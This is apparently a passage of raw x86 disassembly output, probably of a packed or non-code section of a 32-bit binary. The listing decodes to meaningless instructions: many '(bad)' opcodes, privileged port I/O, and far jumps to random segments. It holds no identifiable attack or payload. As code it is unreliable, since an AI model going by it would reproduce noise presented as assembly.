  40bf8b:	scas   eax,DWORD PTR es:[edi]
  40bf8c:	pop    es
  40bf8d:	dec    ebx
  40bf8e:	push   edi
  40bf8f:	(bad)  
  40bf90:	call   0xcabaa248
  40bf95:	sub    eax,DWORD PTR [esi]
  40bf97:	stos   DWORD PTR es:[edi],eax
  40bf98:	and    al,0xfe
  40bf9a:	aaa    
  40bf9b:	pop    edi
  40bf9c:	xchg   esi,eax
  40bf9d:	aam    0x1d
  40bf9f:	mov    ds:0xe43c473e,eax
  40bfa4:	xor    eax,0x86ce299c
  40bfa9:	xchg   ecx,eax
  40bfaa:	sbb    al,0xa6
  40bfac:	stos   DWORD PTR es:[edi],eax
  40bfad:	inc    edi
  40bfae:	out    0x6e,eax
  40bfb0:	or     al,0xbb
  40bfb2:	pushf  
  40bfb3:	add    bl,BYTE PTR [ebp+0x6d442aaa]
  40bfb9:	mov    dl,0xc9
  40bfbb:	xchg   edx,eax
  40bfbc:	nop
  40bfbd:	mov    ebp,0x39fb9605
  40bfc2:	inc    eax
  40bfc3:	sub    cl,BYTE PTR [edx+esi*4]
  40bfc6:	dec    esp
  40bfc7:	mov    ss,edx
  40bfc9:	pusha  
  40bfca:	pop    esp
  40bfcb:	or     ebx,DWORD PTR [edi+0x2cd2e7cd]
  40bfd1:	xchg   esp,eax
  40bfd2:	add    esi,DWORD PTR [eax+0x1b]
  40bfd5:	inc    esp
  40bfd6:	cdq    
  40bfd7:	add    dh,BYTE PTR [ecx-0x244407a0]
  40bfdd:	out    dx,al
  40bfde:	retf   
  40bfdf:	imul   edx,DWORD PTR [edx+0x5eacbd4],0x98dd7aa4
  40bfe9:	sub    BYTE PTR [esi-0x788a95aa],0xf6
  40bff0:	ss cmp eax,0xd8c9fb4e
  40bff6:	daa    
  40bff7:	aas    
  40bff8:	repz out 0x86,al
  40bffb:	mov    ah,0x71
  40bffd:	pop    ebp
  40bffe:	ror    dl,1
  40c000:	xor    eax,0x884bbd7e
  40c005:	mov    al,ds:0x459f8a0b
  40c00a:	mov    edx,0x811fae18
  40c00f:	cwde   
  40c010:	adc    al,0x72
  40c012:	xadd   DWORD PTR [edx],esi
  40c015:	mov    ebx,0xf26d7564
  40c01a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c01b:	fidivr DWORD PTR [edi+0x71]
  40c01e:	call   DWORD PTR [esi*8-0x136bd5b3]
  40c025:	mul    bl
  40c027:	(bad)  
  40c028:	int3   
  40c029:	repnz fbld TBYTE PTR [ebx-0xf9289a5]
  40c030:	aaa    
  40c031:	ss xor ecx,edx
  40c034:	add    eax,0xdfe40ea
  40c039:	mov    BYTE PTR [eax],0x4e
  40c03c:	jb     0x40c0b1
  40c03e:	jp     0x40bfc8
  40c040:	mov    ss,WORD PTR [eax]
  40c042:	fcomp  st(5)
  40c044:	add    ebx,DWORD PTR [esi+0x4e]
  40c047:	xchg   edx,eax
  40c048:	ret    0xe0ed
  40c04b:	(bad)  [edx]
  40c04d:	fwait
  40c04e:	sub    dh,BYTE PTR ds:0x9f861261
  40c054:	mov    ecx,0x8deb9536
  40c059:	sub    DWORD PTR [ebx-0xc89b9ee],ecx
  40c05f:	ror    ah,0xc1
  40c062:	mov    eax,0xb341e688
  40c067:	xchg   DWORD PTR [edi+0x62],ecx
  40c06a:	or     DWORD PTR ds:0x2aa20e42,esp
  40c070:	in     al,0xa7
  40c072:	call   0xd7d0:0xcd6a579f
  40c079:	arpl   WORD PTR ds:0x4db3f545,bp
  40c07f:	xlat   BYTE PTR ds:[ebx]
  40c080:	inc    esi
  40c081:	and    eax,0x491c49b6
  40c086:	nop
  40c087:	gs icebp 
  40c089:	xor    eax,0x3bd979ef
  40c08e:	mov    ecx,0x5563bc84
  40c093:	pop    ebx
  40c094:	sub    edx,DWORD PTR [edx+0x264cc482]
  40c09a:	mov    eax,0xac91d5df
  40c09f:	push   cs
  40c0a0:	icebp  
  40c0a1:	xchg   edi,eax
  40c0a2:	push   edi
  40c0a3:	(bad)  
  40c0a4:	jb     0x40c0f6
  40c0a6:	pop    edi
  40c0a7:	and    ah,0x34
  40c0aa:	jnp    0x40c07d
  40c0ac:	dec    ecx
  40c0ad:	inc    edi
  40c0ae:	lock imul ebp,DWORD PTR [esi-0x7465e70],0x835cfdeb
  40c0b9:	jnp    0x40c116
  40c0bb:	in     al,dx
  40c0bc:	mov    ds:0xf0dcc39a,al
  40c0c1:	push   ecx
  40c0c2:	mov    esi,0xfbfe003b
  40c0c7:	mov    ds:0x2554da0a,al
  40c0cc:	mov    esi,0x918b4e50
  40c0d1:	mov    WORD PTR [eax],fs
  40c0d3:	mov    bl,0xd9
  40c0d5:	jno    0x40c0dc
  40c0d7:	leave  
  40c0d8:	dec    ebp
  40c0d9:	jne    0x40c104
  40c0db:	out    0x93,eax
  40c0dd:	imul   esp,DWORD PTR [esi+0x21],0x24262582
  40c0e4:	out    0x38,al
  40c0e6:	fisub  WORD PTR [esi]
  40c0e8:	imul   eax,DWORD PTR [eax+0x66],0x38002946
  40c0ef:	jle    0x40c146
  40c0f1:	popf   
  40c0f2:	call   0x6213:0x611558b6
  40c0f9:	xchg   edi,eax
  40c0fa:	xchg   DWORD PTR [ebx+0x32],ecx
  40c0fd:	mov    eax,ds:0x79d4302
  40c102:	js     0x40c180
  40c104:	pop    ss
  40c105:	je     0x40c16f
  40c107:	pop    esi
  40c108:	sbb    BYTE PTR [ecx],al
  40c10a:	cwde   
  40c10b:	popa   
  40c10c:	push   edi
  40c10d:	xor    BYTE PTR [ecx],dh
  40c10f:	cmp    al,0x90
  40c111:	les    ebx,FWORD PTR [edi+edi*4]
  40c114:	clc    
  40c115:	mov    esp,0x27e34f01
  40c11a:	pop    ss
  40c11b:	test   al,0x7a
  40c11d:	dec    edx
  40c11e:	fwait
  40c11f:	ret    0x910d
  40c122:	or     DWORD PTR [ebx+0x55062adc],ebp
  40c128:	mov    ecx,0x3c067fad
  40c12d:	iret   
  40c12e:	and    edx,DWORD PTR [ebp+0x11]
  40c131:	push   ebp
  40c132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c133:	ret    0x9171
  40c136:	sub    eax,0x4269f0f3
  40c13b:	test   al,0x73
  40c13d:	imul   ecx,eax,0xffffff92
  40c140:	push   ebp
  40c141:	jno    0x40c0fb
  40c143:	int3   
  40c144:	loopne 0x40c104
  40c146:	daa    
  40c147:	add    BYTE PTR [eax+ecx*2+0x3cc7674b],al
  40c14e:	push   ss
  40c14f:	ds jbe 0x40c130
  40c152:	leave  
  40c153:	sub    al,0x64
  40c155:	add    BYTE PTR [edx+0x687ebec8],al
  40c15b:	in     al,dx
  40c15c:	dec    ecx
  40c15d:	lods   al,BYTE PTR ds:[esi]
  40c15e:	repz or ecx,edi
  40c161:	mov    ch,0x35
  40c163:	or     dl,bl
  40c165:	jo     0x40c181
  40c167:	outs   dx,BYTE PTR ds:[esi]
  40c168:	lds    ebp,FWORD PTR [edi+0x2bed7e79]
  40c16e:	bound  ecx,QWORD PTR [ebp+esi*4-0x77]
  40c172:	push   edx
  40c173:	daa    
  40c174:	pop    ecx
  40c175:	jns    0x40c1ae
  40c177:	pop    ecx
  40c178:	retf   0x6211
  40c17b:	test   DWORD PTR ds:0xe4a545bd,0x95292de1
  40c185:	xchg   ebx,eax
  40c186:	stc    
  40c187:	cmp    ecx,DWORD PTR ds:0xf1deb8df
  40c18d:	out    0xc,eax
  40c18f:	in     eax,dx
  40c190:	out    0x37,al
  40c192:	sti    
  40c193:	inc    ebx
  40c194:	inc    ebp
  40c195:	jb     0x40c198
  40c197:	ss je  0x40c1c6
  40c19a:	dec    edi
  40c19b:	xor    DWORD PTR [edi+edx*4],esp
  40c19e:	cmp    BYTE PTR [edx+0x4a9831d3],0x1d
  40c1a5:	scas   eax,DWORD PTR es:[edi]
  40c1a6:	int3   
  40c1a7:	popf   
  40c1a8:	mov    edx,0xb36f8f7d
  40c1ad:	ret    
  40c1ae:	mov    ebp,ecx
  40c1b0:	(bad)  
  40c1b1:	icebp  
  40c1b2:	mov    BYTE PTR [ebx-0x7e],bl
  40c1b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1b6:	out    0xe3,al
  40c1b8:	jae    0x40c195
  40c1ba:	xchg   BYTE PTR [ebp+0x24],ah
  40c1bd:	push   eax
  40c1be:	mov    bl,bh
  40c1c0:	ficom  DWORD PTR ds:0x4c661f3f
  40c1c6:	or     BYTE PTR [edx],0x20
  40c1c9:	push   0xffffffb3
  40c1cb:	movntps XMMWORD PTR [esi+0x443bfae1],xmm6
  40c1d2:	fwait
  40c1d3:	sahf   
  40c1d4:	pop    ecx
  40c1d5:	sbb    ax,0x5485
  40c1d9:	xchg   ecx,eax
  40c1da:	pop    ds
  40c1db:	outs   dx,DWORD PTR ds:[esi]
  40c1dc:	std    
  40c1dd:	dec    edi
  40c1de:	out    0xd8,eax
  40c1e0:	enter  0xde9e,0xcd
  40c1e4:	push   edi
  40c1e5:	shl    BYTE PTR [ebp+esi*8-0x757f78bc],cl
  40c1ec:	call   0xd97c5c6d
  40c1f1:	(bad)  
  40c1f2:	ror    BYTE PTR ds:0x28c76aa,0x8a
  40c1f9:	popa   
  40c1fa:	sub    cl,BYTE PTR ds:0xecdd6751
  40c200:	ror    edi,1
  40c202:	cmp    ebp,esp
  40c204:	mov    ebp,0x4e368d21
  40c209:	iret   
  40c20a:	ret    
  40c20b:	std    
  40c20c:	add    ah,BYTE PTR [esi-0x11ba672]
  40c212:	scas   eax,DWORD PTR es:[edi]
  40c213:	out    dx,eax
  40c214:	and    DWORD PTR [esi+0x1e],edx
  40c217:	hlt    
  40c218:	inc    esp
  40c219:	retf   0x3ff0
  40c21c:	cmp    dh,BYTE PTR [edx]
  40c21e:	dec    DWORD PTR [edx-0x7a]
  40c221:	dec    esp
  40c222:	pushf  
  40c223:	idiv   ecx
  40c225:	and    BYTE PTR [ecx-0xa68fefa],cl
  40c22b:	popf   
  40c22c:	or     ah,dh
  40c22e:	imul   ebp,DWORD PTR [ecx+0x73],0x7537cdb1
  40c235:	mov    eax,0xb2721454
  40c23a:	mov    ds:0x9dae7a49,eax
  40c23f:	out    dx,eax
  40c240:	xlat   BYTE PTR ds:[ebx]
  40c241:	ret    0x56bc
  40c244:	and    edi,DWORD PTR [esi]
  40c246:	call   0x6bc5:0x12cbbcb3
  40c24d:	mov    edx,0xc384965d
  40c252:	xor    bh,BYTE PTR [ebp-0x1105f0a5]
  40c258:	js     0x40c1e2
  40c25a:	test   eax,0xea46be27
  40c25f:	lea    edx,[ebp+0x13898f18]
  40c265:	clc    
  40c266:	sub    al,0x5d
  40c268:	fs pusha 
  40c26a:	icebp  
  40c26b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c26c:	mov    fs,WORD PTR [ebp+0x69]
  40c26f:	je     0x40c2e3
  40c271:	in     eax,0x1b
  40c273:	jmp    0x7930f4e0
  40c278:	push   0xfa5eb724
  40c27d:	pusha  
  40c27e:	iret   
  40c27f:	pop    es
  40c280:	pop    DWORD PTR [eax-0x66]
  40c283:	ret    0x8d5f
  40c286:	aas    
  40c287:	xchg   ebx,eax
  40c288:	mov    WORD PTR [eax-0x7f2d80ea],cs
  40c28e:	cli    
  40c28f:	or     eax,0xc0a76da1
  40c294:	out    0x7c,eax
  40c296:	sysenter 
  40c298:	push   esp
  40c299:	je     0x40c2ea
  40c29b:	mov    ch,0x6c
  40c29d:	ins    BYTE PTR es:[edi],dx
  40c29e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c29f:	out    0xbd,al
  40c2a1:	pop    ss
  40c2a2:	pop    esp
  40c2a3:	inc    esi
  40c2a4:	enter  0xf669,0xb2
  40c2a8:	in     al,dx
  40c2a9:	xchg   edi,eax
  40c2aa:	sub    eax,0xd013c3e5
  40c2b0:	test   al,0xe2
  40c2b2:	sub    eax,0xd2adcb4b
  40c2b7:	jmp    0x8804baeb
  40c2bc:	add    bl,ch
  40c2be:	fcmove st,st(3)
  40c2c0:	lds    eax,FWORD PTR [edi-0xb1ede6a]
  40c2c6:	test   al,0x31
  40c2c8:	loopne 0x40c309
  40c2ca:	cmp    DWORD PTR [edi+0x39],ebp
  40c2cd:	mov    esi,0xd1cef365
  40c2d2:	cwde   
  40c2d3:	enter  0x9c05,0x59
  40c2d7:	mov    ecx,0x82ceb82f
  40c2dc:	retf   
  40c2dd:	icebp  
  40c2de:	push   edi
  40c2df:	fs int 0x2f
  40c2e2:	xor    DWORD PTR [esp+ebp*2-0x511d6d53],eax
  40c2e9:	jne    0x40c309
  40c2eb:	and    BYTE PTR [ebp-0x21],ch
  40c2ee:	int    0x44
  40c2f0:	pop    ds
  40c2f1:	cld    
  40c2f2:	mov    ?,edx
  40c2f4:	push   esi
  40c2f5:	xor    BYTE PTR [edi-0x7cb5fc96],ch
  40c2fb:	ret    0xce6b
  40c2fe:	mov    esp,fs
  40c300:	shl    DWORD PTR [ecx+0x6c56134f],0x45
  40c307:	jbe    0x40c35e
  40c309:	adc    cl,BYTE PTR [edi+0x67]
  40c30c:	jmp    0x40c364
  40c30e:	mov    BYTE PTR [edx+0x5c27541b],al
  40c314:	sbb    ebp,DWORD PTR [edx]
  40c316:	mov    bl,0xc0
  40c318:	fild   QWORD PTR [ebx-0x4636aa11]
  40c31e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c31f:	ret    0xd6fe
  40c322:	and    bh,BYTE PTR [eax]
  40c324:	jle    0x40c30e
  40c326:	lock sub ah,BYTE PTR [ecx-0xf]
  40c32a:	in     al,0xb6
  40c32c:	cdq    
  40c32d:	adc    eax,0xedce9af8
  40c332:	stos   DWORD PTR es:[edi],eax
  40c333:	xchg   edx,eax
  40c334:	pop    es
  40c335:	jmp    0x40c3b4
  40c337:	mov    al,0xd5
  40c339:	ins    DWORD PTR es:[edi],dx
  40c33a:	ss cmp al,0xbb
  40c33d:	sub    DWORD PTR [esi],ebx
  40c33f:	jne    0x40c306
  40c341:	sub    DWORD PTR [esi],edi
  40c343:	push   ss
  40c344:	jno    0x40c335
  40c346:	cs cdq 
  40c348:	rcl    ebp,0x76
  40c34b:	ficom  WORD PTR [ebx+ebp*2-0x55]
  40c34f:	into   
  40c350:	jne    0x40c301
  40c352:	mov    ds:0xe74c1f34,al
  40c357:	mov    esi,0x2d9588fd
  40c35c:	mov    eax,0x8a164512
  40c361:	std    
  40c362:	sub    DWORD PTR [edi],edi
  40c364:	mov    bh,0x4a
  40c366:	xchg   ecx,eax
  40c367:	xor    eax,0x4254df27
  40c36c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c36d:	mov    eax,edi
  40c36f:	xor    dl,dh
  40c371:	retf   
  40c372:	bound  esp,QWORD PTR [edi-0x43]
  40c375:	cwde   
  40c376:	jp     0x40c3f4
  40c378:	pop    ss
  40c379:	inc    esi
  40c37a:	or     ch,BYTE PTR [eax-0x6b]
  40c37d:	mov    DWORD PTR [eax+0x2a],0xfee8805b
  40c384:	hlt    
  40c385:	pop    ebp
  40c386:	and    al,0x42
  40c388:	out    dx,al
  40c389:	push   cs
  40c38a:	ror    DWORD PTR [edi-0x489ecc79],cl
  40c390:	lock jl 0x40c3b1
  40c393:	xchg   DWORD PTR [ecx-0x467f66fc],esp
  40c399:	mov    edx,0xb345440a
  40c39e:	lds    esi,FWORD PTR [eax+0x1ba561b5]
  40c3a4:	retf   0x5de0
  40c3a7:	cs cli 
  40c3a9:	jge    0x40c345
  40c3ab:	lods   al,BYTE PTR ds:[esi]
  40c3ac:	xchg   edx,ebp
  40c3ae:	adc    bl,dl
  40c3b0:	fucomip st,st(1)
  40c3b2:	adc    eax,0xee315455
  40c3b7:	cwde   
  40c3b8:	sub    al,0x51
  40c3ba:	dec    edx
  40c3bb:	xchg   ecx,eax
  40c3bc:	jns    0x40c401
  40c3be:	(bad)  
  40c3bf:	pushf  
  40c3c0:	leave  
  40c3c1:	js     0x40c3a4
  40c3c3:	fist   DWORD PTR [eax-0xc7de27e]
  40c3c9:	rol    BYTE PTR [ebx],1
  40c3cb:	xor    ah,BYTE PTR [ecx-0x5a]
  40c3ce:	comiss xmm3,DWORD PTR [ebx]
  40c3d1:	call   0x8105:0x998d1a90
  40c3d8:	jmp    0x110cc0fd
  40c3dd:	aaa    
  40c3de:	dec    esi
  40c3df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3e0:	fmul   QWORD PTR [edx-0x33fcd479]
  40c3e6:	mov    BYTE PTR [eax+0x32],ch
  40c3e9:	mov    tr7,esp
  40c3ec:	add    edx,DWORD PTR [esp+esi*8-0x1d]
  40c3f0:	pop    DWORD PTR [edi-0x41]
  40c3f3:	jmp    0xa25a:0x75357488
  40c3fa:	ss nop
  40c3fc:	add    DWORD PTR [edx],edx
  40c3fe:	push   ecx
  40c3ff:	pop    ebp
  40c400:	pop    edi
  40c401:	jp     0x40c430
  40c403:	or     al,0x8
  40c405:	adc    BYTE PTR [eax-0x600f1344],dl
  40c40b:	retf   0x20b6
  40c40e:	test   esp,ecx
  40c410:	pop    ss
  40c411:	xor    ebx,DWORD PTR [ebp+0x22]
  40c414:	inc    ebp
  40c415:	sub    bl,ch
  40c417:	adc    bh,BYTE PTR [ebx]
  40c419:	pop    ecx
  40c41a:	xor    eax,0xc35df68b
  40c41f:	pop    ebp
  40c420:	leave  
  40c421:	iret   
  40c422:	je     0x40c482
  40c424:	(bad)  
  40c425:	pop    edi
  40c426:	dec    edx
  40c427:	adc    BYTE PTR [ebx+ebx*4-0x35],0x6f
  40c42c:	jbe    0x40c4a3
  40c42e:	iret   
  40c42f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c430:	in     al,dx
  40c431:	add    DWORD PTR [esi+0x6d6417bd],ecx
  40c437:	leave  
  40c438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c439:	test   ecx,eax
  40c43b:	in     eax,0xaa
  40c43d:	sub    eax,0x1343514d
  40c442:	adc    DWORD PTR [ecx-0x412e37f5],edi
  40c448:	push   ss
  40c449:	mov    ds:0x61a2274e,eax
  40c44e:	mov    ch,0xa4
  40c450:	jg     0x40c4d0
  40c452:	sti    
  40c453:	and    DWORD PTR cs:[ebp+0x34],ebx
  40c457:	fdiv   DWORD PTR [ebp-0x9]
  40c45a:	js     0x40c409
  40c45c:	or     BYTE PTR [ecx-0x42],0x2c
  40c460:	test   eax,0xc9bb4ca4
  40c465:	add    eax,0x5004a319
  40c46a:	jge    0x40c4ba
  40c46c:	loope  0x40c4b4
  40c46e:	mov    eax,ds:0x2e7d6959
  40c473:	retf   
  40c474:	(bad)  
  40c475:	mov    ds:0x4e2443f3,al
  40c47a:	push   0x48
  40c47c:	sub    al,0x8e
  40c47e:	pop    esp
  40c47f:	push   cs
  40c480:	aas    
  40c481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c483:	xlat   BYTE PTR ds:[ebx]
  40c484:	sbb    ecx,ebp
  40c486:	and    BYTE PTR [esi+esi*2+0x46acb89],0x3c
  40c48e:	sub    ecx,DWORD PTR [ebx-0x50c9a320]
  40c494:	fndisi(8087 only) 
  40c496:	jg     0x40c498
	...
  40c514:	es ss pop ecx
  40c517:	sbb    BYTE PTR [ecx+0x7f],bl
  40c51a:	addr16 ds loope 0x40c540
  40c51e:	dec    edx
  40c51f:	inc    esp
  40c520:	mov    ss,WORD PTR [ecx-0x35]
  40c523:	clc    
  40c524:	push   DWORD PTR [eax+eax*1+0x0]
  40c528:	imul   eax,DWORD PTR [edi],0x0
  40c52b:	add    BYTE PTR ds:0xcddf993a,cl
  40c531:	pushf  
  40c532:	add    DWORD PTR [ecx-0x19],ebx
  40c535:	(bad)  
  40c537:	mov    bh,0x3
  40c539:	int3   
  40c53a:	sub    bl,cl
  40c53c:	iret   
  40c53d:	xchg   ebx,eax
  40c53e:	into   
  40c53f:	or     al,0xc9
  40c541:	je     0x40c566
  40c543:	mov    BYTE PTR [ecx+0x6109556],dh
  40c549:	fadd   QWORD PTR [esi-0x6b]
  40c54c:	jg     0x40c5c5
  40c54e:	add    ebp,ebx
  40c550:	inc    edx
  40c551:	lods   eax,DWORD PTR ds:[esi]
  40c552:	dec    ebx
  40c553:	adc    ecx,ecx
  40c555:	mov    dh,BYTE PTR [ebp-0x3a860459]
  40c55b:	pop    ebp
  40c55c:	aam    0xea
  40c55e:	or     BYTE PTR ds:0x4896fc53,cl
  40c564:	jmp    0x44cd:0x9d6da750
  40c56b:	cwde   
  40c56c:	lea    ecx,ds:0x550247b1
  40c572:	sub    bh,BYTE PTR [edx-0x1]
  40c575:	inc    esi
  40c576:	xor    al,0x59
  40c578:	shl    eax,1
  40c57a:	sbb    al,ch
  40c57c:	or     BYTE PTR [ebx+0x47],ah
  40c57f:	(bad)  
  40c580:	div    DWORD PTR [esi+0x74]
  40c583:	je     0x40c59f
  40c585:	daa    
  40c586:	retf   
  40c587:	scas   eax,DWORD PTR es:[edi]
  40c588:	cmp    al,0x2d
  40c58a:	or     esi,esp
  40c58c:	pop    ecx
  40c58d:	inc    esp
  40c58e:	xor    eax,0xb39372d1
  40c593:	jnp    0x40c583
  40c595:	jmp    0xce:0x982a4665
  40c59c:	pop    edx
  40c59d:	xor    esi,ecx
  40c59f:	les    edx,FWORD PTR [esi-0x38]
  40c5a2:	test   DWORD PTR [edx],edx
  40c5a4:	stos   BYTE PTR es:[edi],al
  40c5a5:	push   es
  40c5a6:	pop    ss
  40c5a7:	mov    BYTE PTR [ebx],cl
  40c5a9:	mov    edx,0x2190723
  40c5ae:	add    eax,0xd9ee5f1b
  40c5b3:	sbb    ebp,DWORD PTR [edi-0x2c]
  40c5b6:	mov    eax,0x30fd8c82
  40c5bb:	cld    
  40c5bc:	xor    dh,BYTE PTR [ebp+0x64]
  40c5bf:	mov    eax,0xb84f831
  40c5c4:	add    eax,0x1febcf7
  40c5c9:	sbb    al,0x10
  40c5cb:	iret   
  40c5cc:	cmp    eax,0xc30fe10f
  40c5d1:	ret    0x1298
  40c5d4:	idiv   BYTE PTR [esi]
  40c5d6:	sbb    DWORD PTR [edi],ebx
  40c5d8:	nop
  40c5d9:	jbe    0x40c578
  40c5db:	inc    ebp
  40c5dc:	fdiv   DWORD PTR [edx-0x60eb4b43]
  40c5e2:	push   esi
  40c5e3:	push   cs
  40c5e4:	inc    esp
  40c5e5:	imul   ebp,DWORD PTR [edx],0x418b3688
  40c5eb:	inc    di
  40c5ed:	pop    esp
  40c5ee:	imul   ebp,esp,0x7640d32d
  40c5f4:	jnp    0x40c625
  40c5f6:	test   DWORD PTR [esi-0x33486c21],0x9b3cf98
  40c600:	xor    al,0x77
  40c602:	xchg   DWORD PTR [edx-0x1e56fe6c],ecx
  40c608:	es jbe 0x40c683
  40c60b:	jmp    0x175a33a9
  40c610:	shl    al,0x6c
  40c613:	cld    
  40c614:	push   cs
  40c615:	xchg   edx,eax
  40c616:	mov    ecx,0x8cc0357f
  40c61b:	mov    ch,0x2b
  40c61d:	test   BYTE PTR [ecx*4+0x68064bba],dh
  40c624:	sbb    eax,DWORD PTR [ebx]
  40c626:	das    
  40c627:	pop    eax
  40c628:	jle    0x40c665
  40c62a:	loop   0x40c6a7
  40c62c:	push   ds
  40c62d:	pop    esp
  40c62e:	jecxz  0x40c5cd
  40c630:	fimul  WORD PTR [eax+0x69]
  40c633:	retf   0x5ad8
  40c636:	xchg   ebx,eax
  40c637:	stc    
  40c638:	les    edx,FWORD PTR [esi-0x64318157]
  40c63e:	pop    esp
  40c63f:	jbe    0x40c61a
  40c641:	repnz cdq 
  40c643:	nop
  40c644:	or     al,0x94
  40c646:	dec    eax
  40c647:	mov    dl,0x30
  40c649:	sbb    al,0x75
  40c64b:	das    
  40c64c:	clc    
  40c64d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c64e:	in     al,0x15
  40c650:	lods   al,BYTE PTR ds:[esi]
  40c651:	das    
  40c652:	int3   
  40c653:	pushf  
  40c654:	js     0x40c617
  40c656:	dec    ebx
  40c657:	adc    al,0x4
  40c659:	mov    ch,0xbd
  40c65b:	xchg   ebx,eax
  40c65c:	or     DWORD PTR [eax-0x79],edi
  40c65f:	adc    BYTE PTR [eax],dl
  40c661:	fcmovu st,st(1)
  40c663:	ret    
  40c664:	mov    ebx,0x61ac3357
  40c669:	mov    esp,0x68b3db4a
  40c66e:	and    eax,0x3e373253
  40c673:	out    0x3e,al
  40c675:	neg    cl
  40c677:	inc    ecx
  40c678:	pop    ds
  40c679:	cs ror ch,0xe9
  40c67d:	leave  
  40c67e:	xor    eax,0x1c7c6193
  40c683:	fstp   st(6)
  40c685:	dec    edi
  40c686:	leave  
  40c687:	pop    esp
  40c688:	xchg   ecx,eax
  40c689:	dec    edi
  40c68a:	ins    BYTE PTR es:[edi],dx
  40c68b:	pop    eax
  40c68c:	clc    
  40c68d:	mov    bh,0xe6
  40c68f:	jge    0x40c6ac
  40c691:	inc    ecx
  40c692:	(bad)  
  40c693:	aad    0x7c
  40c695:	xor    BYTE PTR [ecx-0x7576d6e1],0x64
  40c69c:	pop    edx
  40c69d:	cmp    al,0xa
  40c6a0:	in     eax,0xd
  40c6a2:	ja     0x40c6ae
  40c6a4:	sti    
  40c6a5:	lods   eax,DWORD PTR ds:[esi]
  40c6a6:	jne    0x40c658
  40c6a8:	sub    al,0xfd
  40c6aa:	das    
  40c6ab:	push   0x34
  40c6ad:	or     DWORD PTR [ecx+ebx*8+0x6a5017e],esi
  40c6b4:	imul   esi,DWORD PTR [edx-0x2214cb65],0xfc7aef6a
  40c6be:	or     BYTE PTR [ebx-0x1a08f08d],0xc7
  40c6c5:	mov    al,0x2f
  40c6c7:	and    DWORD PTR [ebx+ecx*2],ebp
  40c6ca:	inc    esi
  40c6cb:	outs   dx,DWORD PTR ds:[esi]
  40c6cc:	mov    dl,0x7c
  40c6ce:	cmp    al,0xc8
  40c6d0:	or     al,0x84
  40c6d2:	pop    eax
  40c6d3:	fcom   QWORD PTR [esi]
  40c6d5:	push   es
  40c6d6:	jb     0x40c6fd
  40c6d8:	adc    bl,BYTE PTR [edx]
  40c6da:	(bad)  
  40c6dc:	aad    0xbf
  40c6de:	adc    ah,BYTE PTR [ebx-0x35]
  40c6e1:	fbstp  TBYTE PTR [edx+0x771004cc]
  40c6e7:	shl    al,cl
  40c6e9:	xlat   BYTE PTR ds:[ebx]
  40c6ea:	xlat   BYTE PTR ds:[ebx]
  40c6eb:	xchg   ebp,eax
  40c6ec:	adc    edi,DWORD PTR [edx+0x432dfcd8]
  40c6f2:	dec    esp
  40c6f3:	nop
  40c6f4:	out    dx,eax
  40c6f5:	mov    ecx,ebp
  40c6f7:	mov    esi,0xa4fbb06d
  40c6fc:	scas   eax,DWORD PTR es:[edi]
  40c6fd:	daa    
  40c6fe:	and    BYTE PTR [esp+esi*8+0x72403015],0x55
  40c706:	jnp    0x40c6b1
  40c708:	into   
  40c709:	ret    0x5914
  40c70c:	xchg   ebx,eax
  40c70d:	cmp    ebp,DWORD PTR [ebp+0x15]
  40c710:	inc    ebp
  40c711:	call   0x53613ab1
  40c716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c717:	daa    
  40c718:	jno    0x40c790
  40c71a:	fwait
  40c71b:	(bad)  
  40c71c:	xor    cl,BYTE PTR [ebx]
  40c71e:	aaa    
  40c71f:	sbb    bl,bh
  40c721:	out    dx,al
  40c722:	mov    DWORD PTR [esi-0xe],esp
  40c725:	cmp    cl,BYTE PTR ds:0xf300795b
  40c72b:	push   eax
  40c72c:	adc    BYTE PTR [ebx+0x7b],dl
  40c72f:	lahf   
  40c730:	inc    edx
  40c731:	xor    ebx,esi
  40c733:	rol    BYTE PTR [eax],cl
  40c735:	inc    edx
  40c736:	xor    cl,BYTE PTR [ecx]
  40c738:	push   0xde962544
  40c73d:	push   edx
  40c73e:	mov    BYTE PTR [ebp+0x12534b9b],al
  40c744:	pop    edx
  40c745:	repz in eax,0xc7
  40c748:	inc    ebp
  40c749:	xchg   ecx,eax
  40c74a:	dec    ebx
  40c74b:	inc    eax
  40c74c:	loope  0x40c739
  40c74e:	mov    ds:0xc14de9c1,al
  40c753:	ins    BYTE PTR es:[edi],dx
  40c754:	push   edi
  40c755:	bound  ecx,QWORD PTR [ebx-0x6b]
  40c758:	pusha  
  40c759:	dec    edi
  40c75a:	(bad)  
  40c75b:	rcl    BYTE PTR [edx+0x6346a4c5],cl
  40c761:	jecxz  0x40c727
  40c763:	inc    edx
  40c764:	jns    0x40c7ab
  40c766:	sbb    eax,edx
  40c768:	sub    edx,esi
  40c76a:	scas   al,BYTE PTR es:[edi]
  40c76b:	sub    ah,BYTE PTR [esi]
  40c76d:	xor    al,0x2f
  40c76f:	rol    BYTE PTR [edi+0x58018d66],1
  40c775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c776:	mov    ebp,?
  40c778:	cmp    eax,0xd885c098
  40c77d:	push   cs
  40c77e:	and    bl,BYTE PTR [eax+0x290997f3]
  40c784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c785:	jecxz  0x40c74b
  40c787:	push   ebx
  40c788:	jg     0x40c746
  40c78a:	mov    eax,0x7bf5493c
  40c78f:	cmp    eax,ebx
  40c791:	hlt    
  40c792:	sti    
  40c793:	pop    ecx
  40c794:	push   edi
  40c795:	iret   
  40c796:	cmp    DWORD PTR ds:0x9f5f6dea,ebp
  40c79c:	xor    esi,DWORD PTR [edi]
  40c79e:	xchg   ecx,eax
  40c79f:	pop    eax
  40c7a0:	jo     0x40c763
  40c7a2:	or     BYTE PTR [esi],cl
  40c7a4:	push   cs
